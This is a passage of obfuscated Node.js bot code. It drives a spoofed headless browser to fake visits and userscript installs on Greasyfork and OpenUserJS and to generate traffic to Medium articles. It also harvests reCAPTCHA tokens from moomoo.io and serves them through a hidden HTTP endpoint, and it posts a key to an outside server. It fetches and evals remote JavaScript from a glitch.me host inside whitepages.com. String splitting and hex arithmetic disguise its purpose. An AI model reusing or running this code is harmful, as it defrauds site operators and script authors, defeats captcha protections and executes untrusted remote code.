      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + X(0xf) + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1e70 + -0x1 * -0x94f + 0x5 * -0x7f3
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x859 + 0x5 * -0x368 + 0x1961)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0xf3f + 0x777 + -0x1652 * 0x1), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1c9d + -0x151 * 0x6 + -0x2b * 0x79), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x4 * 0x982 + 0x5df + 0x2be7 * -0x1;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x321 * 0x2 + 0x12 * -0x15e + 0x125a; w < getRandomInt(0xfe5 * -0x2 + -0x222b + 0x41f6, -0x2 * -0x211 + -0x2e9 * 0x2 + 0x1b5); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1 * 0x937d + -0x107b7 + -0x142ca * -0x2);
        }
      }();
    }, -0x7 * 0x100 + -0x100c + 0x7d0 * 0x3), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0xf7 * 0x4 + -0x38b + -0x51 * 0x1;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1d19 + 0x3 * -0xc3d + -0x6 * -0xaf8, -0x1 * -0x713 + -0x3b * -0x89 + 0x4 * -0x99d)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x2 * 0x5e3e + 0xcbd5 + 0x65d7);
    }, -0x23b5 + -0x8a4 + 0x2cbd), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x2c * 0x3 + -0x12 * 0x223 + 0x25f2;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x801 + 0x4 * 0x3e + -0x13 * -0x25), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1af2 + -0x11e1 * -0x2 + 0x8d0 * -0x1), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x235 * -0x919 + 0xc0b * -0x51 + 0xfb * -0x296);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1262 + 0x19a + 0x112c);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x27a * 0x8 + -0x1 * -0x4e9 + -0x5 * -0x323);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x3c14 * 0x1 + -0x1 * -0x2d71 + 0x2e33 * 0x1);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0xed3 + 0x1aec * 0x1 + -0x29bf);
    let h = e[f];
    if (b['rhGJSu'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x18d + 0x5cf * 0x2 + -0xa11, s, t, u = 0x1d * -0x10f + 0x1f59 * -0x1 + -0x344 * -0x13; t = n['charAt'](u++); ~t && (s = r % (0xaaf * 0x1 + 0x7fb + -0x12a6) ? s * (0x1b5c * 0x1 + 0x6d2 + 0x21ee * -0x1) + t : t, r++ % (0x1c90 + -0x1d09 * 0x1 + 0x7d * 0x1)) ? p += String['fromCharCode'](-0x47 * 0x62 + -0x219f * 0x1 + 0x3dcc & s >> (-(0x112d + -0x223d + 0x1112) * r & 0x21af * 0x1 + -0x4ae * -0x8 + -0x4719)) : 0x1b * 0x9a + 0xa7b * -0x3 + 0x1 * 0xf33) {
          t = o['indexOf'](t);
        }
        for (let v = 0x11ba + 0xc86 + -0x1e40, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1f42 + 0x152d + 0x173 * 0x7))['slice'](-(0x563 + 0x1 * -0x95 + -0x4cc));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x3 * 0x817 + -0x1986 + 0x141,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1c19 + -0x59b * -0x1 + 0x167e * 0x1; u < 0x406 * 0x3 + -0x2bb + -0x1 * 0x857; u++) {
          p[u] = u;
        }
        for (u = -0x1d * 0xe9 + -0x67 * -0x2b + 0x918; u < 0x2142 + 0x1c7a + -0x17 * 0x2a4; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x6 * 0x3be + -0xbc7 + 0x1 * -0x9ad), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x8 * 0x22b + 0x260b + -0x14b3, q = 0xc * 0x28d + 0x2529 + -0x1697 * 0x3;
        for (let v = 0x1 * 0xdd1 + -0x2160 + 0x138f; v < n['length']; v++) {
          u = (u + (-0x6cb * -0x1 + -0x1ef1 + 0x2af * 0x9)) % (-0x1939 + -0x12b9 + 0x16 * 0x20b), q = (q + p[u]) % (0xd94 + -0x91b + -0x379), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x2 * 0xbd5 + 0xd7 * 0xc + 0xfe * -0x21)]);
        }
        return t;
      };
      b['OMrrbg'] = m, c = arguments, b['rhGJSu'] = !![];
    }
    const j = e[-0x7af + 0xa * 0x4a + 0x4cb],
      k = f + j,
      l = c[k];
    return !l ? (b['CktMDa'] === undefined && (b['CktMDa'] = !![]), h = b['OMrrbg'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = c,
    a2 = d;
  async function f() {
    const a1 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x14e * -0x13 + 0x2107 + -0x20f * 0x4) {
        const a0 = b;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + a0(0x3, 'cY24')['length'] + (-0x3 * 0x84e + 0x6e2 + 0x1209));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x1ba4 + -0x146d + -0x737, D['indexOf']('\x20'));
        return B ? E['slice'](-0xec9 * -0x1 + 0x185 * 0xa + -0x1dfb * 0x1, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x4031 * 0x1 + 0x4537 + -0x5e58),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x[a1(0xd)])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x5d0 + 0x4457 + -0x1777),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + a2(0x6) + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + a3(0x5) + '/zyenith/M' + 'oomoo.io_R' + a2(0x0) + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x788 + -0xe71 * -0x2 + -0x246a * 0x1; k < -0x23d7 + 0x227b + 0x160; k++)
    setTimeout(f, (-0x35e * 0x4 + -0x529 * -0x4a + -0x8602) * k * getRandomInt(-0x21 * -0x8d + 0x189f + -0x2acb, 0x14ea + 0x1bd2 + -0x30b9 * 0x1));
  setInterval(() => {
    f();
    for (let l = 0x18aa + -0x1 * -0x1502 + -0x2dac; l < 0x3d8 + -0x9 * 0x1ee + 0x2 * 0x6c5; l++)
      setTimeout(f, (0x1aa28 + -0x1d07b * 0x1 + 0x110b3) * l * getRandomInt(0x311 * -0x3 + 0x1 * 0x1131 + -0x1 * 0x7fd, -0x561 + 0x1 * -0x16e5 + 0x1c49));
  }, 0x2 * 0x1b4de4 + 0x101b1 * -0x31 + -0x31a599 * -0x1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
